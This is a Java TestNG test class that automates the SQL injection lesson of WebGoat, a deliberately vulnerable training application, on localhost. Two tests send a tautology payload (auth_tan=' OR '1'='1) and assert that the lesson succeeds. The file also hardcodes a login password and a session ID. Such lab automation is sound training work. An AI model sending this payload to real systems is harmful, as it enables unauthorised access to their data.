package tests;

import static io.restassured.RestAssured.given;
import static org.hamcrest.Matchers.equalTo;

import org.testng.annotations.BeforeTest;
import org.testng.annotations.Listeners;
import org.testng.annotations.Test;

import Utils.ExtentReportListener;
import io.restassured.RestAssured;
import io.restassured.response.Response;

@Listeners(ExtentReportListener.class)

public class WebGoat8Api {

	private String baseUrl = "http://localhost:8080";
	private String loginEndpoint = "/WebGoat/login";
	private String sqlInjectionEndpoint = "/WebGoat/SqlInjection/attack8";
	private static String jsessionId = "gbUvEtVK8aNMMJN0OCsduXCcUXXZRgcNuWQjGzMX";

	@BeforeTest
	public void setup() {
		RestAssured.baseURI = baseUrl;
	}

	@Test(priority = 1, enabled = true)
	public void testLoginAndGetSessionId() {
		String username = "shivamkathayat";
		String password = "1234567";

		// Send login request with logging
		Response loginResponse = given().log().all() // Log request and response
				.formParam("username", username).formParam("password", password)
				.header("Upgrade-Insecure-Requests", "1").header("Referer", "http://localhost:8080/WebGoat/login")
				.header("Connection", "keep-alive").when().post(loginEndpoint).then().log().all() // Log request and
																									// response
				.statusCode(302).extract().response();

		// Extract JSESSIONID from the response headers
		//jsessionId = loginResponse.getCookie("JSESSIONID");

		// Print JSESSIONID for debugging purposes
		System.out.println("JSESSIONID: " + jsessionId);
		System.out.println(" ");
	}

	@Test(priority = 2, enabled = true)
	public void testSuccessfulSqlInjection() {
		// Send SQL injection request with logging
		given().log().all() // Log request and response
				.cookie("JSESSIONID", jsessionId).header("Content-Type", "application/x-www-form-urlencoded")
				.header("Host", "localhost:8080").header("Referer", "http://localhost:8080/WebGoat/start.mvc")
				.header("X-Requested-With", "XMLHttpRequest").header("Origin", "http://localhost:8080")
				.header("Accept-Encoding", "*/*").header("Connection", "keep-alive")
				.body("name=A&auth_tan='+OR+'1'%3D'1") // Send // the
														// payload
														// as
														// raw
														// data
				.when().post(sqlInjectionEndpoint).then().log().all() // Log request and response
				.statusCode(200).body("lessonCompleted", equalTo(true)).body("feedback", equalTo(
						"You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!"));
	}

	@Test(priority = 3, enabled = true)
	public void testSuccessfulSqlInjectionEmptyName() {
		// Send SQL injection request with logging
		given().log().all() // Log request and response
				.cookie("JSESSIONID", jsessionId).header("Content-Type", "application/x-www-form-urlencoded")
				.body("name=&auth_tan='+OR+'1'%3D'1") // Send
														// the
														// payload
														// as
														// raw
														// data
				.when().post(sqlInjectionEndpoint).then().log().all() // Log request and response
				.statusCode(200).body("lessonCompleted", equalTo(true)).body("feedback", equalTo(
						"You have succeeded! You successfully compromised the confidentiality of data by viewing internal information that you should not have access to. Well done!"));
	}

	@Test(priority = 4, enabled = true)
	public void testSqlInjectionWronInput() {
		// Send SQL injection request with logging
		given().log().all() // Log request and response
				.cookie("JSESSIONID", "xxxx").header("Content-Type", "application/x-www-form-urlencoded")
				.body("name=A&auth_tan=invalid") // Send the
													// payload
													// as
													// raw
													// data
				.when().post(sqlInjectionEndpoint).then().log().all() // Log request and response
				.statusCode(200).body("lessonCompleted", equalTo(false)).body("feedback", equalTo(
						"No employee found with matching last name. Or maybe your authentication TAN is incorrect?"));
	}
}